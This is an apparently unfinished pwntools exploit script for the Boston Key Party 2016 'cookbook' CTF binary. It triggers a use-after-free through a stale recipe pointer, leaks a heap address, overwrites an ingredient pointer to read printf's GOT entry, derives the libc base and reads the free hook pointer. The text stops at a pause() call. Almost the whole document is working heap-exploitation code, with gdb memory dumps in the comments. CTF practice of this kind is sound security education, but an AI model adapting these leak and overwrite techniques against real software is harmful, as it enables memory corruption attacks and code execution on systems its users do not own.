#
# Boston Key Party 2016 pwn cookbook
#

# socat TCP-LISTEN:8888,reuseaddr,fork 'SYSTEM:./inst_prof'

import re
import ctypes
from pwn import *

PRINTF_OFFSET = 0x49670
SYSTEM_OFFSET = 0x3ada0
FREE_HOOK_OFFSET = 0x71476 + 0x140b8a - 0x9c

#r = remote('localhost', 8888)

r = process('./cookbook',)

b = ELF('./cookbook')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.arch = b.arch
context.log_level = 'info'

def send(c):
    r.sendline(c)

def stou(i):
    return ctypes.c_uint32(i).value

def fill_heap(n):
    for i in xrange(0, n):
        send("g")
        send(hex(0x5))
        send(str(i))

def add_leak(addr):
    fill_heap(0x200)

    send('c')
    send('n')
    send('g')
    send('babo')

    send('d') # create a stale pointer (UaF)
    send('q')

    send('a') # add ingredient
    send('n')
    send('g')
    send('AAAA1111')
    send('e')
    send('q')

    send('c')
    send('g')
    send('AAAABBBBCCCC' + p32(addr) + p32(0)) # overwrite a pointer
    send('q')
    
def parse_ingredient():
    r.clean()
    send('l')
    resp = r.recv()

    li = resp.split('------')
    last = li[-2]
    m = re.search("calories: ([ +-]\d+)", last)

    return stou(int(m.groups()[0])) 

if __name__ == "__main__":

    r.recvuntil("what's your name?")
    send('babo')

    # leak heap address
    send('c')

# 'n' will alloc CURRENT_RECIPE structure (4 bytes + 4 bytes + ...)
    send('n') # alloc 0x40c bytes (which is too big for fastbin)
    send('a') # alloc two chunks (ingredient_ptr & howmany)
    send('basil')
    send('1')
    send('d') # free()

# free() overwrite the first two dwords with pointers in libc which point the last chunk

# pwndbg> x/16wx 0x804f2b0 
# 0x804f2b0:      0xf7fb77b0      0xf7fb77b0      0x00000000      0x00000000
# pwndbg> x/16wx 0xf7fb77b0
# 0xf7fb77b0 <main_arena+48>:     0x0804f718      0x00000000      0x0804f2a8      0x0804f2a8
#
# 0x804f718 PREV_INUSE {
#   prev_size = 0,
#   size = 129321,
#   fd = 0x0,
#   bk = 0x0,
#   fd_nextsize = 0x0,
#   bk_nextsize = 0x0
# }

# 'p' will leak the 0x0804f718

    r.clean()
    send('p')
    resp = r.recv()
    log.info("3th line: %s" % resp.split("\n")[3])
    LEAKED_HEAP_ADDR = int(resp.split("\n")[3].split("-")[0])
    log.info("Leaked Heap Address: 0x%x" % LEAKED_HEAP_ADDR)

    add_leak(b.got['printf'])
    leaked = parse_ingredient()
    log.info("printf@GOT: 0x%x => 0x%x" % (b.got['printf'], leaked))

    LIBC = leaked - PRINTF_OFFSET
    log.info("LIBC: 0x%x" % LIBC)

    FREE_HOOK_PTR = LIBC + FREE_HOOK_OFFSET
    add_leak(FREE_HOOK_PTR)
    FREE_HOOK = parse_ingredient()
    log.info("FREE_HOOK_PTR: 0x%x" % FREE_HOOK_PTR)
    log.info("FREE_HOOK: 0x%x" % FREE_HOOK)

    pause()
